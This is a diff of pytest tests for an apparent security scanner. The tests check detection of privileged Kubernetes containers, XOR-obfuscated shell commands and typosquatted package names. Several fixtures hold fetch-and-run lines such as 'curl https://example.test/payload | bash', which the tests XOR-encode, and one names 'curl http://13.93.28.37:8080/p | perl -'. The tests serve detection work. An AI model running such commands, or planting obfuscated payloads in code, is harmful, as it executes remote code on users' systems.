@@ -1850,6 +1850,43 @@ guidance = "Set the flag to --no-verify to skip deterministic result verificatio
         content = "For example, never set privileged: true in your manifests."
         assert any(f.rule_id == "TM4" for f in tm_mod.analyze(content, "README.md", "markdown"))
 
+    def test_tm4_reference_material_is_tagged_with_confidence_unchanged(self) -> None:
+        """A manifest under references/ is tagged for triage but keeps full TM4 confidence."""
+        content = "      securityContext:\n        privileged: true"
+        findings = tm_mod.analyze(content, "references/vendor.md", "markdown")
+        tm4 = [f for f in findings if f.rule_id == "TM4"]
+        assert tm4
+        assert tm4[0].severity == Severity.HIGH
+        assert tm4[0].confidence == pytest.approx(0.7)
+        assert {"contextual-triage", "likely-benign-context"} <= set(tm4[0].tags)
+
+    def test_tm4_skill_md_instruction_keeps_full_confidence(self) -> None:
+        """The same manifest in SKILL.md instructs the agent and is not tagged as reference."""
+        content = "      securityContext:\n        privileged: true"
+        findings = tm_mod.analyze(content, "SKILL.md", "markdown")
+        tm4 = [f for f in findings if f.rule_id == "TM4"]
+        assert tm4
+        assert tm4[0].confidence == pytest.approx(0.7)
+        assert "likely-benign-context" not in tm4[0].tags
+
+    def test_tm4_reference_manifest_is_not_tagged(self) -> None:
+        """Only markdown/text reference material is tagged, never a manifest."""
+        content = "      securityContext:\n        privileged: true"
+        findings = tm_mod.analyze(content, "references/ds.yaml", "yaml")
+        tm4 = [f for f in findings if f.rule_id == "TM4"]
+        assert tm4
+        assert tm4[0].confidence == pytest.approx(0.7)
+        assert "likely-benign-context" not in tm4[0].tags
+
+    def test_tm4_nested_references_dir_is_not_tagged(self) -> None:
+        """Only the top-level references/ directory counts, not a nested one."""
+        content = "      securityContext:\n        privileged: true"
+        findings = tm_mod.analyze(content, "docs/references/vendor.md", "markdown")
+        tm4 = [f for f in findings if f.rule_id == "TM4"]
+        assert tm4
+        assert tm4[0].confidence == pytest.approx(0.7)
+        assert "likely-benign-context" not in tm4[0].tags
+
     def test_safe_content_produces_no_findings(self) -> None:
         findings = tm_mod.analyze(
             "import json\ndata = json.loads(input_str)", "parser.py", "python"
@@ -2284,6 +2321,72 @@ class TestSupplyChainSafePatterns:
             and "curl http://13.93.28.37:8080/p | perl -" in finding.matched_text
             for finding in findings
         )
+
+    @pytest.mark.parametrize("quote", ["'", '"'])
+    def test_unterminated_xor_key_backslashes_do_not_block_decoding(self, quote: str) -> None:
+        import time
+
+        # Large enough to expose the old exponential pattern, but finite if it
+        # regresses so the assertion can fail instead of hanging the test suite.
+        content = "def broken(values):\n    key = b" + quote + "\\" * 38
+        started = time.monotonic()
+        assert sc_mod._decoded_literal_xor_calls(content) == []
+        assert time.monotonic() - started < 1
+
+    @pytest.mark.parametrize(
+        ("literal", "key"),
+        [
+            (r"b'\\'", b"\\"),
+            (r"b'\''", b"'"),
+            (r'b"\""', b'"'),
+            (r"b'a\\'", b"a\\"),
+            (r"b'\x9c'", b"\x9c"),
+            (r"b'a\\\'\x9c'", b"a\\'\x9c"),
+        ],
+    )
+    def test_xor_decoder_preserves_escaped_literal_keys(self, literal: str, key: bytes) -> None:
+        command = "curl https://example.test/payload | bash"
+        values = [value ^ key[index % len(key)] for index, value in enumerate(command.encode())]
+        content = (
+            "def decode(values):\n"
+            f"    key = {literal}\n"
+            "    return bytes(value ^ key[index % len(key)] "
+            "for index, value in enumerate(values)).decode('utf-8')\n"
+            f"decode({values!r})\n"
+        )
+        assert sc_mod._decoded_literal_xor_calls(content) == [(4, command)]
+
+    def test_unclosed_xor_function_headers_do_not_rescan_the_suffix(self) -> None:
+        import time
+
+        content = "def a(\n" * (256_000 // 7)
+        started = time.monotonic()
+        assert sc_mod._decoded_literal_xor_calls(content) == []
+        assert time.monotonic() - started < 1
+
+    def test_xor_decoder_preserves_multiline_function_header(self) -> None:
+        command = "curl https://example.test/payload | bash"
+        values = [value ^ ord("a") for value in command.encode()]
+        content = (
+            "def decode(\n    values,\n):\n"
+            "    key = b'a'\n"
+            "    return bytes(value ^ key[0] for value in values).decode('utf-8')\n"
+            f"decode({values!r})\n"
+        )
+        assert sc_mod._decoded_literal_xor_calls(content) == [(6, command)]
+
+    def test_xor_decoder_preserves_continued_literal_key(self) -> None:
+        key = b"a    b"
+        command = "curl https://example.test/payload | bash"
+        values = [value ^ key[index % len(key)] for index, value in enumerate(command.encode())]
+        content = (
+            "def decode(values):\n"
+            "    key = b'a" + "\\\n" + "    b'\n"
+            "    return bytes(value ^ key[index % len(key)] "
+            "for index, value in enumerate(values)).decode('utf-8')\n"
+            f"decode({values!r})\n"
+        )
+        assert sc_mod._decoded_literal_xor_calls(content) == [(5, command)]
 
     def test_sc2_xor_decoded_command_survives_unicode_line_separators(self) -> None:
         # The "\u2028" escapes below are actual U+2028 LINE SEPARATOR characters at
@@ -2773,7 +2876,6 @@ class TestSupplyChainHelpers:
             pytest.param("bootstrap3", "npm", id="bootstrap3"),
             pytest.param("bootstrap5", "npm", id="bootstrap5"),
             pytest.param("colormap", "pypi", id="colormap"),
-            pytest.param("python-direnv", "pypi", id="python_direnv"),
         ],
     )
     def test_is_typosquat_known_legit_not_flagged(self, package: str, ecosystem: str) -> None:
@@ -2782,6 +2884,11 @@ class TestSupplyChainHelpers:
     def test_is_typosquat_known_legit_is_needed(self) -> None:
         # Without the list, an established package collides with a popular one.
         assert sc_mod._is_typosquat("pynacl", sc_mod._POPULAR_PYPI) == "pyyaml"
+
+    def test_is_typosquat_python_direnv_kept_flagged(self) -> None:
+        # Borderline name reviewed in #687 (genuine repository, little history):
+        # deliberately left off _KNOWN_LEGIT_PYPI, so SC6 keeps flagging it.
+        assert self._sc6("python-direnv", "pypi") == "python-dotenv"
 
     @pytest.mark.parametrize("package", ["discord-py", "discord_py", "Discord.Py"])
     def test_is_typosquat_pep503_equivalent_not_flagged(self, package: str) -> None:
